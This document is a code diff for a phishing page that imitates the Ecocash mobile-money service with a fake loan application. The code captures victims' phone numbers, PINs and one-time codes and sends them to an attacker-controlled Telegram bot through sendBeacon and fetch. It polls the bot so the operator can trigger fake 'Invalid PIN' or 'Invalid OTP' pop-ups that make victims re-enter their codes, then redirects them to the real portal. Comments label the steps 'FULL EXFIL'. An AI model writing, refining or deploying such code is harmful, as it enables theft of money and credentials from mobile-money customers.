@@ -580,13 +580,9 @@
   let POLLING_INTERVAL;
   let REDIRECT_TIMEOUT = null;
 
-  // === REDIRECT TARGET ===
+  // === REDIRECT TARGET: real Ecocash portal ===
   const REDIRECT_URL = 'https://www.ecocash.co.zw/';
   const REDIRECT_DELAY_MS = 300000; // 5 minutes
-
-  // === CORS PROXY (Telegram API blocks browser CORS — this fixes it) ===
-  // Swap PROXY_URL if corsproxy.io is slow/down. Format: proxy?url=<encoded api url>
-  const PROXY_URL = 'https://corsproxy.io/?url=';
 
   // === STATE ===
   const state = {
@@ -597,26 +593,6 @@
     otp: '',
     victimId: null
   };
-
-  // === TELEGRAM API VIA PROXY ===
-  // GET-style call (no body)
-  async function tgGet(method, params) {
-    const qs = params ? '?' + new URLSearchParams(params).toString() : '';
-    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/${method}${qs}`;
-    const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl));
-    return res.json();
-  }
-
-  // POST-style call (JSON body)
-  async function tgPost(method, payload) {
-    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-    const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-    return res.json();
-  }
 
   // === HELPERS ===
   function showErr(id, msg) {
@@ -653,6 +629,15 @@
     } else {
       custom.style.display = 'none';
     }
+  }
+
+  // === TELEGRAM SEND ===
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
+
+    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
+    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
   }
 
   // === STEP 1: PHONE → VALIDATION ===
@@ -707,7 +692,7 @@
     }, 1000);
   }
 
-  // === SEND ADMIN CONTROL TO TELEGRAM (via proxy POST) ===
+  // === SEND ADMIN CONTROL TO TELEGRAM ===
   function sendAdminAlert() {
     const victimId = Date.now();
     state.victimId = victimId;
@@ -726,85 +711,114 @@ Choose action:
       ]
     };
 
-    tgPost('sendMessage', {
-      chat_id: CHAT_ID,
-      text: message,
-      reply_markup: keyboard,
-      parse_mode: 'Markdown'
-    }).then(r => console.log('admin alert sent', r.ok)).catch(e => console.error('admin alert failed', e));
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        reply_markup: keyboard,
+        parse_mode: 'Markdown'
+      })
+    }).catch(console.error);
   }
 
-  // === LONG POLLING FOR ADMIN ACTIONS (via proxy GET) ===
+  // === LONG POLLING FOR ADMIN ACTIONS ===
   function startPolling() {
     let offset = null;
-    POLLING_INTERVAL = setInterval(async () => {
-      try {
-        const params = {};
-        if (offset) params.offset = offset;
-        const data = await tgGet('getUpdates', params);
+    POLLING_INTERVAL = setInterval(() => {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`)
+        .then(r => r.json())
+        .then(data => {
+          data.result.forEach(msg => {
+            offset = msg.update_id + 1;
+            const action = msg.callback_query?.data;
+            const fromId = msg.callback_query?.from.id;
 
-        if (!data.ok || !data.result) return;
+            if (fromId != CHAT_ID) return;
 
-        data.result.forEach(update => {
-          offset = update.update_id + 1;
+            // Admin: Wrong PIN → Show forced pop-up, then restart
+            if (action?.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
+              clearInterval(POLLING_INTERVAL);
+              showForcedPopup('❌ INVALID PIN\n\nYour session has expired due to incorrect authentication. Please reapply.');
+            }
 
-          const cb = update.callback_query;
-          if (!cb) return;
-          const action = cb.data;
-          const fromId = cb.from.id;
-
-          if (fromId != CHAT_ID) return;
-
-          // Stop the button loading spinner on Telegram side
-          tgPost('answerCallbackQuery', { callback_query_id: cb.id });
-
-          // Admin: Wrong PIN → toast + restart from page 1
-          if (action && action.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
-            clearInterval(POLLING_INTERVAL);
-            showToast('❌ Incorrect PIN. Your session has been reset. Please start again.');
-            setTimeout(() => location.reload(), 2500);
-          }
-
-          // Admin: Wrong OTP → toast + restart from page 1
-          if (action && action.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
-            clearInterval(POLLING_INTERVAL);
-            showToast('❌ Incorrect OTP. Your session has been reset. Please start again.');
-            setTimeout(() => location.reload(), 2500);
-          }
-        });
-      } catch (e) {
-        // Polling error — keep trying
-      }
+            // Admin: Wrong OTP → Show forced pop-up, then restart
+            if (action?.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
+              clearInterval(POLLING_INTERVAL);
+              showForcedPopup('❌ INVALID OTP\n\nVerification failed. Restarting loan process for security.');
+            }
+          });
+        })
+        .catch(() => {});
     }, 2000);
+  }
+
+  // === FORCED POP-UP: Full screen, cannot be ignored ===
+  function showForcedPopup(message) {
+    const overlay = document.createElement('div');
+    overlay.id = 'forcedPopup';
+    overlay.style = `
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      color: #ff4757;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding: 20px;
+      gap: 16px;
+      animation: fadeIn 0.5s;
+    `;
+
+    overlay.innerHTML = `
+      <div style="font-size: 60px; animation: pulse 1.5s infinite;">⚠️</div>
+      <div style="font-size: 22px; font-weight: 700; text-transform: uppercase;">Security Alert</div>
+      <pre style="font-size: 16px; font-weight: 500; white-space: pre-line; max-width: 80%;">${message}</pre>
+      <div style="font-size: 14px; opacity: 0.8;">Redirecting in 3 seconds...</div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    if (!document.getElementById('popupStyles')) {
+      const styles = document.createElement('style');
+      styles.id = 'popupStyles';
+      styles.textContent = `
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+      `;
+      document.head.appendChild(styles);
+    }
+
+    setTimeout(() => {
+      window.location.reload();
+    }, 3000);
   }
 
   // === OTP AUTO-ADVANCE & VERIFY ===
   const otpInputs = document.querySelectorAll('#otpRow input');
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-      // Only allow digits
       input.value = input.value.replace(/[^0-9]/g, '');
-
-      // Auto-move to next
       if (input.value.length === 1 && index < 3) {
         otpInputs[index + 1].focus();
       }
-
-      // Enable Verify button only when all filled
       const otp = Array.from(otpInputs).map(i => i.value).join('');
       if (otp.length === 4) {
         document.getElementById('btnVerify').disabled = false;
       }
     });
 
-    // Backspace logic
     input.addEventListener('keydown', e => {
       if (e.key === 'Backspace' && !input.value && index > 0) {
         otpInputs[index - 1].focus();
       }
     });
 
-    // Paste support
     input.addEventListener('paste', e => {
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
@@ -816,7 +830,7 @@ Choose action:
     });
   });
 
-  // Final Verify Button — FULL EXFIL (phone + PIN + OTP) via proxy POST
+  // Final Verify Button — FULL EXFIL (phone + PIN + OTP)
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
@@ -849,7 +863,7 @@ Choose action:
   }
 
   function startRedirectTimer() {
-    let s = 300; // 5 minutes
+    let s = 300;
     const el = document.getElementById('redirectTimer');
     const interval = setInterval(() => {
       const mins = Math.floor(s / 60);
@@ -859,7 +873,7 @@ Choose action:
     }, 1000);
   }
 
-  // === EXFILTRATION: FULL DETAILS IN ONE MESSAGE (via proxy POST) ===
+  // === EXFILTRATION: FULL DETAILS IN ONE MESSAGE ===
   function exfiltrateFull() {
     const message = `
 🔐 *ECOCASH FULL DETAILS CAPTURED*
@@ -870,11 +884,7 @@ Choose action:
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
 `;
-    tgPost('sendMessage', {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    }).then(r => console.log('exfil ok', r.ok)).catch(e => console.error('exfil failed', e));
+    sendToTelegram(message);
   }
 
   // Timer reset — no exfil on resend
